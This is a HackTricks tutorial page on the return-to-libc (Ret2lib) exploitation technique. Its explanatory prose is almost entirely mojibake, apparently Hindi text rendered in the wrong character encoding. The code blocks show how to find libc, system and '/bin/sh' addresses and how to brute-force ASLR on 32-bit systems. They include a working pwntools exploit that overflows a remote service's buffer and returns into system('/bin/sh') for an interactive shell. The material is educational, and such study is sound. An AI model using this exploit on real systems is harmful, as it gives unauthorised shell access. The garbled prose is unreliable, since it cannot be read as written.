# Ret2lib

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Basic Information**

**Ret2Libc** рдХрд╛ рд╕рд╛рд░ рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рдПрдХ рдХрдордЬреЛрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╡рд╛рд╣ рдХреЛ рдПрдХ рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп (рдЬреИрд╕реЗ, **system**, **execve**, **strcpy**) рдХреЗ рднреАрддрд░ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреА рдУрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдмрдЬрд╛рдп рдЗрд╕рдХреЗ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╢реЗрд▓рдХреЛрдб рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПред рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдкреЗрд▓реЛрдб рддреИрдпрд╛рд░ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕реНрдЯреИрдХ рдкрд░ рд▓реМрдЯрдиреЗ рдХреЗ рдкрддреЗ рдХреЛ рдЙрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдлрд╝рдВрдХреНрд╢рди рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ рдЖрд╡рд╢реНрдпрдХ рддрд░реНрдХреЛрдВ рдХреЛ рдХреЙрд▓рд┐рдВрдЧ рдХрдиреНрд╡реЗрдВрд╢рди рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рд╡реНрдпрд╡рд╕реНрдерд╛ рднреА рдХрд░рддрд╛ рд╣реИред

### **Example Steps (simplified)**

* рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ (рдЬреИрд╕реЗ system) рдФрд░ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб (рдЬреИрд╕реЗ /bin/sh)
* рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреЛ рдХрдорд╛рдВрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╡рд╛рд╣ рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ

## Finding the addresses

* рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА `libc` рд╡рд░реНрддрдорд╛рди рдорд╢реАрди рд╕реЗ рд╣реИ, рдЖрдк рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдореЗрдореЛрд░реА рдореЗрдВ рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛрдЧреА: 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

рдпрджрд┐ рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ ASLR libc рдХреЗ рдкрддреЗ рдХреЛ рдмрджрд▓ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* libc рдХрд╛ рдЬреНрдЮрд╛рди рд╣реЛрдиреЗ рдкрд░ `system` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдСрдлрд╝рд╕реЗрдЯ рдвреВрдВрдврдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* libc рдХрд╛ рдЬреНрдЮрд╛рди рд╣реЛрдиреЗ рдкрд░, `/bin/sh` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдСрдлрд╝рд╕реЗрдЯ рдвреВрдВрдврдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

libc рдХрд╛ рдЬреНрдЮрд╛рди рд╣реЛрдиреЗ рдкрд░, Peda рдпрд╛ GEF рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **system** рдлрд╝рдВрдХреНрд╢рди, **exit** рдлрд╝рдВрдХреНрд╢рди рдФрд░ рд╕реНрдЯреНрд░рд┐рдВрдЧ **`/bin/sh`** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдпрджрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣рд░ рдмрд╛рд░ рдЖрдкрдХреЗ рд╕рд╛рде рдмрд╛рдд рдХрд░рддреЗ рд╕рдордп **рдмрдЪреНрдЪреЗ** рдмрдирд╛ рд░рд╣реА рд╣реИ (рдиреЗрдЯрд╡рд░реНрдХ рд╕рд░реНрд╡рд░) рддреЛ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдкрдврд╝рдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ (рд╕рдВрднрд╡рддрдГ рдЖрдкрдХреЛ рд░реВрдЯ рд╣реЛрдирд╛ рдкрдбрд╝реЗрдЧрд╛)ред

рдпрд╣рд╛рдБ рдЖрдк **рд╕рдЯреАрдХ рд░реВрдк рд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ libc рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ** рдФрд░ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╣рд░ рдмрдЪреНрдЪреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛рдБ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ**ред

![](<../../../.gitbook/assets/image (853).png>)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ **0xb75dc000** рдореЗрдВ рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ (рдпрд╣ libc рдХрд╛ рдмреЗрд╕ рдкрддрд╛ рд╣реЛрдЧрд╛)

## рдЕрдЬреНрдЮрд╛рдд libc

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк **рдирд╣реАрдВ рдЬрд╛рдирддреЗ рдХрд┐ рдмрд╛рдЗрдирд░реА рдХреМрди рд╕рд╛ libc рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИ** (рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХрд┐рд╕реА рд╕рд░реНрд╡рд░ рдкрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреЛрдИ рдкрд╣реБрдБрдЪ рдирд╣реАрдВ рд╣реИ)ред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк **рдХреБрдЫ рдкрддреЗ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреЗрджреНрдпрддрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реА libc** рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

рдФрд░ рдЖрдк рдЗрд╕рдХреЗ рд▓рд┐рдП рдПрдХ pwntools рдЯреЗрдореНрдкрд▓реЗрдЯ рдпрд╣рд╛рдБ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2 рдСрдлрд╕реЗрдЯ рдХреЗ рд╕рд╛рде libc рдЬрд╛рдирдирд╛

рдкреГрд╖реНрда [https://libc.blukat.me/](https://libc.blukat.me/) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдФрд░ libc рдХреЗ рдЕрдВрджрд░ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ **рдХреБрдЫ рдкрддреЗ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ рд╕рдВрд╕реНрдХрд░рдг** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдБред

## 32 рдмрд┐рдЯреНрд╕ рдореЗрдВ ASLR рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛

рдпреЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ рд╣рдорд▓реЗ **рдХреЗрд╡рд▓ 32 рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИрдВ**ред

* рдпрджрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╕реНрдерд╛рдиреАрдп рд╣реИ, рддреЛ рдЖрдк libc рдХреЗ рдмреЗрд╕ рдкрддреЗ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (32 рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* рдпрджрд┐ рдЖрдк рдПрдХ рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░ рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк **`libc` рдлрд╝рдВрдХреНрд╢рди `usleep` рдХреЗ рдкрддреЗ рдХреЛ рдмреВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП 10 рдХреЛ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд░рддреЗ рд╣реБрдПред рдпрджрд┐ рдХрд┐рд╕реА рдмрд┐рдВрджреБ рдкрд░ **рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдиреЗ рдореЗрдВ 10 рд╕реЗрдХрдВрдб рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдордп рд▓реЗрддрд╛ рд╣реИ**, рддреЛ рдЖрдкрдиреЗ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд▓рд┐рдпрд╛ рд╣реИред

## One Gadget

рдПрдХ рд╢реЗрд▓ рдХреЛ рдХреЗрд╡рд▓ **рдПрдХ** рд╡рд┐рд╢рд┐рд╖реНрдЯ **рдкрддреЗ** рдкрд░ рдХреВрджрдХрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Code Example

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ ASLR рдмреВрдЯ-рдлреЛрд░реНрд╕ рдХреЛ рдХреЛрдб рдореЗрдВ рдПрдХреАрдХреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдХрдордЬреЛрд░ рдмрд╛рдЗрдирд░реА рдПрдХ рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░ рдкрд░ рд╕реНрдерд┐рдд рд╣реИ:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib рдХреЛрдб рдЙрджрд╛рд╣рд░рдг

рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib рдЙрджрд╛рд╣рд░рдг

ARM64 рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, ret рдирд┐рд░реНрджреЗрд╢ рдЙрд╕ рд╕реНрдерд╛рди рдкрд░ рдХреВрджрддрд╛ рд╣реИ рдЬрд╣рд╛рдБ x30 рд░рдЬрд┐рд╕реНрдЯрд░ рдЗрдВрдЧрд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рди рдХрд┐ рдЬрд╣рд╛рдБ рд╕реНрдЯреИрдХ рд░рдЬрд┐рд╕реНрдЯрд░ рдЗрдВрдЧрд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдпрд╣ рдереЛрдбрд╝рд╛ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИред

ARM64 рдореЗрдВ рдПрдХ рдирд┐рд░реНрджреЗрд╢ рд╡рд╣реА рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдирд┐рд░реНрджреЗрд╢ рдХрд░рддрд╛ рд╣реИ (рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рдмреАрдЪ рдореЗрдВ рдХреВрджрдирд╛ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдирдП рдореЗрдВ рдмрджрд▓рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ)ред

рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВ:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (рдпрд╛ puts)

рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ **рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ `printf`/`puts` рдХреЛ рдХреБрдЫ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдбреЗрдЯрд╛ рдХреЛ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрд▓ рдХрд░рдХреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `puts` рдХреЗ GOT рдореЗрдВ рдкрддреЗ рдХреЛ `puts` рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ рдбрд╛рд▓рдиреЗ рд╕реЗ **рдпрд╛рджрд╛рд╢реНрдд рдореЗрдВ `puts` рдХрд╛ рдкрддрд╛ рд▓реАрдХ рд╣реЛрдЧрд╛**ред

## Ret2printf

рдЗрд╕рдХрд╛ рдореВрд▓рддрдГ рдорддрд▓рдм рд╣реИ **Ret2lib рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рддрд╛рдХрд┐ рдЗрд╕реЗ `printf` рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рднреЗрджреНрдпрддрд╛ рдореЗрдВ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рдП** `ret2lib` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ printf рдХреЛ рдЙрди рдорд╛рдиреЛрдВ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд░рдирд╛ рдЬреЛ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ (рдмреЗрддреБрдХрд╛ рд▓рдЧрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╕рдВрднрд╡ рд╣реИ):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, libc рдореЗрдВ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо рд▓реЗрдХрд┐рди рдХреЛрдИ PIE рдирд╣реАрдВ, рдкрд╣рд▓рд╛ рдХрджрдо рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХреЛ рднрд░рдирд╛ рд╣реИ рдЬрдм рддрдХ рдХрд┐ рдХреИрдирд░реА рдХрд╛ рдмрд╛рдЗрдЯ 0x00 рди рд╣реЛ рдЬрд╛рдП рддрд╛рдХрд┐ рдлрд┐рд░ puts рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдЗрд╕реЗ рд▓реАрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдХреИрдирд░реА рдХреЗ рд╕рд╛рде рдПрдХ ROP рдЧреИрдЬреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ puts рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ GOT рд╕реЗ puts рдХрд╛ рдкрддрд╛ рд▓реАрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдлрд┐рд░ `system('/bin/sh')` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ ROP рдЧреИрдЬреЗрдЯред
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 рдмрд┐рдЯ, ASLR рд╕рдХреНрд╖рдо, рдХреЛрдИ рдХреИрдирд░реА рдирд╣реАрдВ, рдореБрдЦреНрдп рд╕реЗ рдПрдХ рдмрдЪреНрдЪреЗ рдХреЗ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛред GOT рд╕реЗ puts рдХреЗ рдкрддреЗ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП puts рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЧреИрдЬреЗрдЯ рдФрд░ рдлрд┐рд░ рдПрдХ рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВред
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 рдмрд┐рдЯ, рдХреЛрдИ pie рдирд╣реАрдВ, рдХреЛрдИ рдХреИрдирд░реА рдирд╣реАрдВ, рдХреЛрдИ relro рдирд╣реАрдВ, nxред рд▓рд┐рдЦрдиреЗ рдХреЗ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓рд┐рдЦрдиреЗ рдХреЗ рдкрддреЗ (libc) рдХреЛ рд▓реАрдХ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рдЧреИрдЬреЗрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* рд╕реНрдЯреИрдХ рд╕реЗ рдХреИрдирд░реА рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ `/bin/sh` рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рде рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛред
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 рдмрд┐рдЯ, рдХреЛрдИ relro рдирд╣реАрдВ, рдХреЛрдИ рдХреИрдирд░реА рдирд╣реАрдВ, nx, pieред рд╕реНрдЯреИрдХ рд╕реЗ libc рдФрд░ heap рдХреЗ рдкрддреЗ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЦрд░рд╛рдм рдЗрдВрдбреЗрдХреНрд╕рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧред `system('/bin/sh')` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ret2lib рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдВ (heap рдХрд╛ рдкрддрд╛ рдПрдХ рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ)ред

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}
